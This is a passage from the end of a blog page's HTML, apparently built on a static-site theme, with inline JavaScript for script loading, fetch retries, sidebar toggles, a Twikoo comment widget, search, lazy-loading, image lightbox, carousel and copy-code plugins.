      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
